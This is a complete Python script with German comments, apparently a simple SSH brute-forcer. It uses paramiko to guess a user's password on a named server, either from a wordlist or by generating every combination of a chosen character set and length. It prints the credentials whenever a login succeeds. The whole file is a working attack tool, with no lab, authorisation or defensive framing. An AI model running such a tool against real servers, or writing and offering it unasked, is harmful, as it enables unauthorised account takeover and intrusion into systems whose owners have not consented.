import argparse
import paramiko
import itertools
import string

def ssh_connect(username, server, password):
    """Versucht, sich per SSH mit den gegebenen Zugangsdaten zu verbinden."""
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, username=username, password=password, timeout=5)
        print(f"[+] Erfolgreich angemeldet: {username}@{server} mit Passwort: {password}")
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception as e:
        print(f"[!] Fehler: {e}")
        return False

def dictionary_attack(username, server, wordlist):
    """Führt einen Dictionary-Angriff mit einer gegebenen Wordlist durch."""
    try:
        with open(wordlist, "r") as file:
            for password in file:
                password = password.strip()
                if ssh_connect(username, server, password):
                    return
    except FileNotFoundError:
        print("[!] Wordlist-Datei nicht gefunden.")

def brute_force_attack(username, server, min_len, max_len, charset):
    """Führt eine Brute-Force-Attacke mit generierten Passwörtern durch."""
    for length in range(min_len, max_len + 1):
        for password in itertools.product(charset, repeat=length):
            password = "".join(password)
            if ssh_connect(username, server, password):
                return

def main():
    parser = argparse.ArgumentParser(description='Einfacher SSH-Brute-Forcer')
    parser.add_argument('-u', '--username', required=True, help='Benutzername')
    parser.add_argument('-s', '--server', required=True, help='Server (IP oder DNS)')
    parser.add_argument('-w', '--wordlist', help='Pfad zur Wordlist für Dictionary-Angriff')
    parser.add_argument('--min', type=int, default=4, help='Minimale Passwortlänge für Brute Force')
    parser.add_argument('--max', type=int, default=6, help='Maximale Passwortlänge für Brute Force')
    parser.add_argument('-c', '--charset', default=string.ascii_lowercase + string.digits, help='Zeichensatz für Brute Force')
    args = parser.parse_args()

    if args.wordlist:
        dictionary_attack(args.username, args.server, args.wordlist)
    else:
        brute_force_attack(args.username, args.server, args.min, args.max, args.charset)

if __name__ == "__main__":
    main()
